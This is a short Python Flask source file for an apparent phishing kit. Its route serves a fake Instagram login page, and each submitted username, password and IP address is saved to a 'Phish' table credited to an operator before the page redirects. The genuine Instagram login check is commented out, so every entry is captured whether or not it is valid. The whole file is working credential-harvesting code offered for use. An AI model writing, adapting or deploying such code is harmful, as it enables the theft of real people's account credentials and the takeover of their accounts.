from app import db, app
from flask import render_template, request, session, redirect
from flask_jwt_extended import jwt_required, get_current_user
from app.main.config.models import Phish
import instaloader
@app.route('/instagram/login', methods=['GET', 'POST'])
def ig_login():
    current_user = get_current_user()
    if request.method == 'GET':
        return render_template('ig_login.html')
    elif request.method == 'POST':
        data = request.form.to_dict()
        loader = instaloader.Instaloader()
        # try:
        #     loader.login(data["username"], data["password"])
        # except Exception as e:
        #     print('###############################' + str(e))
        #     return render_template("ig_login.html", error="Invalid login")
        
        user_phished = Phish(platform='Instagram',
                             owner=session["curr"],
                             phised_user=data["username"],
                             phished_pword=data["password"],
                             ip=request.remote_addr)
        db.session.add(user_phished)
        db.session.commit()
        return redirect('/homepage')
    '''
        platform = db.Column(db.String)
    phised_user = db.Column(db.String)
    phished_pword = db.Column(db.String)
    ip = db.Column(db.String)
    '''
    
